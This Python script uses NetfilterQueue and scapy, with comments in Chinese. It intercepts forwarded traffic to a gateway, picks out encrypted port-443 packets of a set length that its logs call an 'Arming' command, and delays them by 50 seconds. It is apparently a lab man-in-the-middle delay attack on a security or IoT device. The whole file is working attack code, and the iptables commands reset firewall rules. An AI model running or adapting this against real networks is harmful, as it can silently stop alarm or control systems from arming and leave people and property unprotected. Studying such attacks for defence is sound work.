# -*- coding: utf-8 -*-
from netfilterqueue import NetfilterQueue
from scapy.all import *
import time
import threading
import os
from datetime import datetime

GATEWAY_IP = "192.168.0.48"
# 关键修改：给长度增加一个小范围缓冲，防止 TLS 填充干扰
TARGET_LEN_MIN = 188
TARGET_LEN_MAX = 200
DELAY_TIME = 50

def get_time():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]

def delay_packet(pkt, payload, arrival_time):
    tcp_seq = pkt[TCP].seq if pkt.haslayer(TCP) else "N/A"
    print("\n" + "!"*60)
    print("[{}] >>> [A1-HIT] 命中目标 Arming 指令!".format(get_time()))
    print("| 拦截时刻: {} | Seq: {} | 长度: {}".format(arrival_time, tcp_seq, len(pkt)))
    print("| 动作: 进入 {}s 延迟队列...".format(DELAY_TIME))
    print("!"*60)
    time.sleep(DELAY_TIME)
    payload.accept()
    print("[{}] <<< [A1-RELEASE] 释放指令".format(get_time()))

def process_packet(payload):
    arrival_time = get_time()
    data = payload.get_payload()
    pkt = IP(data)

    # 判定：下行 443 端口
    if pkt.dst == GATEWAY_IP and pkt.haslayer(TCP) and pkt[TCP].sport == 443:
        # 如果长度匹配 200-210 范围
        if TARGET_LEN_MIN <= len(pkt) <= TARGET_LEN_MAX:
            threading.Thread(target=delay_packet, args=(pkt, payload, arrival_time)).start()
            return
        else:
            # 即使不是 203，只要是网关的 443 下行包，也打个日志，证明脚本在活
            print("[{}] [DEBUG] 网关下行包经过 | 长度: {}".format(arrival_time, len(pkt)))

    payload.accept()

# --- 关键：强制清理并重置环境 ---
print("[*] 正在强制重置环境...")
os.system("sysctl -w net.ipv4.ip_forward=1") # 必须确保转发开启
os.system("iptables -F FORWARD")
# 暂时去掉源端口 443 的限制，拦截所有发往网关的流量进入脚本判断
os.system("iptables -A FORWARD -d {} -j NFQUEUE --queue-num 0".format(GATEWAY_IP))
os.system("iptables -A FORWARD -j ACCEPT")

nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)

try:
    print("[*] 监听开启：网关 {} | 目标长度范围 {}-{}".format(GATEWAY_IP, TARGET_LEN_MIN, TARGET_LEN_MAX))
    nfqueue.run()
except KeyboardInterrupt:
    os.system("iptables -F FORWARD")
    print("\n[*] 实验结束。")